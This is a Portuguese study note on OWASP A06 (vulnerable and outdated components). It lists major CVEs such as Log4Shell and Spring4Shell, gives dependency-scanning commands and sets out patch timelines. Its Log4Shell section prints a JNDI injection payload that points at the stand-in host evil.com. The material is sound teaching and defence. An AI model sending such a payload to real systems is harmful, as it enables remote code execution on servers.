---
source_file: "src/app.component.ts"
type: "attack"
community: "Security Vulnerabilities"
owasp: "A06:2021 — Vulnerable and Outdated Components"
defended_by: "Active Dependency Management (OWASP Dependency-Check)"
tags:
  - segurança
  - ataque
  - java
  - owasp
  - graphify/concept
  - ufcd10791
related:
  - "[[Active Dependency Management (OWASP Dependency-Check)]]"
  - "[[Code Injection]]"
  - "[[Security by Design]]"
  - "[[OWASP_Top10]]"
---

# Using Components with Known Vulnerabilities

> Uso de bibliotecas, frameworks ou componentes com vulnerabilidades conhecidas (CVEs). Defesa: [[Active Dependency Management (OWASP Dependency-Check)]].

## O Que É

A maioria das aplicações modernas é composta principalmente por código de terceiros (dependências). Se uma dependência tem uma vulnerabilidade conhecida (CVE) e não foi atualizada, a aplicação herda essa vulnerabilidade — mesmo que o código próprio seja perfeito.

## Casos Reais de Grande Impacto

| CVE | Componente | Impacto | Score CVSS |
|---|---|---|---|
| **CVE-2021-44228** | Apache Log4j 2 (Log4Shell) | RCE remoto — bastava um log | **10.0 CRÍTICO** |
| **CVE-2022-22965** | Spring Framework (Spring4Shell) | RCE em certos deployments | **9.8 CRÍTICO** |
| **CVE-2017-5638** | Apache Struts (Equifax) | RCE → 147M registos vazados | **10.0 CRÍTICO** |
| **CVE-2021-45046** | Apache Log4j 2.15 | Bypass do fix inicial | **9.0 CRÍTICO** |
| **CVE-2019-14379** | Jackson Databind | Desserialização RCE | **9.8 CRÍTICO** |

## Por Que É Subestimado

```
Típico projeto Spring Boot tem:
  - 5 dependências diretas declaradas no pom.xml
  - 150+ dependências transitivas (dependências das dependências)
  
Sem ferramentas automáticas, é impossível rastrear CVEs manualmente
em 150+ componentes que mudam com cada nova versão.
```

## Log4Shell — Anatomia do Ataque

```java
// Log4j 2.x — vulnerabilidade na funcionalidade de lookup
// A aplicação simplesmente faz um log de input do utilizador:
logger.info("User agent: " + request.getHeader("User-Agent"));

// Atacante envia como User-Agent:
// ${jndi:ldap://evil.com/exploit}

// Log4j processa o lookup → faz pedido LDAP para evil.com
// evil.com serve payload Java → execução de código no servidor!
// Sem nenhuma mudança no código da aplicação — apenas uma dependência desatualizada
```

## Superfície de Ataque

```
Componentes vulneráveis podem existir em:
├── Dependências Maven/Gradle diretas
├── Dependências transitivas (dependências das dependências)
├── Imagens Docker base (ubuntu:20.04 com pacotes desatualizados)
├── Runtime (JDK, servidor de aplicações Tomcat/JBoss)
├── Ferramentas de build (Maven, Gradle plugins)
└── Infraestrutura (sistemas operativos, firmware)
```

## Como Identificar

```bash
# Maven — listar dependências com vulnerabilidades
mvn dependency-check:check

# Verificar versão de uma dependência específica
mvn dependency:tree | grep log4j

# GitHub Dependabot — alertas automáticos no repositório
# Settings → Security → Dependabot alerts → Enable
```

## Cronograma de Resposta a CVEs

```
CVSS 9.0-10.0 (Crítico): patch em 24h — deploy de emergência
CVSS 7.0-8.9  (Alto):    patch em 7 dias
CVSS 4.0-6.9  (Médio):   patch no próximo sprint
CVSS 0.1-3.9  (Baixo):   próxima atualização planeada
```

## Defesa

→ [[Active Dependency Management (OWASP Dependency-Check)]] — OWASP DC Maven plugin, Snyk, Dependabot, pip-audit

## Ligações

- Vulnerabilidade explorada frequentemente via: [[Code Injection]]
- Defesa: [[Active Dependency Management (OWASP Dependency-Check)]]
- Filosofia: [[Security by Design]]
- Mapa: [[OWASP_Top10]] · [[HOME]]
